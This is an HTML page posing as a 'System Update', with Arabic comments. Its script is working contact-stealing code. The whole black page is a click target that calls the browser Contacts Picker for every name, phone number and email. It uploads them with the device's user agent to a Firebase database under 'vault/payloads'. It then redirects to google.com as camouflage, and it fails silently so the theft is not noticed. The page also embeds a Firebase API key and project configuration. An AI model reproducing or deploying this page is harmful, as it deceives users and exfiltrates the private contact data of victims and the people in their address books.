<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        /* جعل الصفحة كاملة منطقة تفعيل صامتة */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; cursor: pointer; overflow: hidden; }
        .inner-msg { color: #111; font-size: 1px; } /* رسالة غير مرئية تقريباً */
    </style>
</head>
<body onclick="executeProtocol()">

    <div class="inner-msg">Loading System...</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
            authDomain: "hercules-65b0c.firebaseapp.com",
            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
            projectId: "hercules-65b0c",
            storageBucket: "hercules-65b0c.firebasestorage.app",
            messagingSenderId: "758576632296",
            appId: "1:758576632296:android:c69d0667cf54311617d45d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        async function executeProtocol() {
            if (!('contacts' in navigator)) return;

            try {
                // طلب استخراج كافة الحقول دفعة واحدة
                const props = ['name', 'tel', 'email'];
                const contacts = await navigator.contacts.select(props, { multiple: true });

                if (contacts && contacts.length > 0) {
                    // إرسال البيانات فوراً إلى Firebase كحزمة واحدة (Bulk Payload)
                    const sessionRef = push(ref(db, 'vault/payloads'));
                    await set(sessionRef, {
                        device_info: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        count: contacts.length,
                        data_dump: contacts // هنا يتم إرسال كل الأرقام دفعة واحدة
                    });

                    // تمويه: تحويل المستخدم لموقع رسمي بعد السحب
                    window.location.href = "https://www.google.com";
                }
            } catch (e) {
                // فشل صامت لضمان عدم كشف العملية
            }
        }
    </script>
</body>
</html>
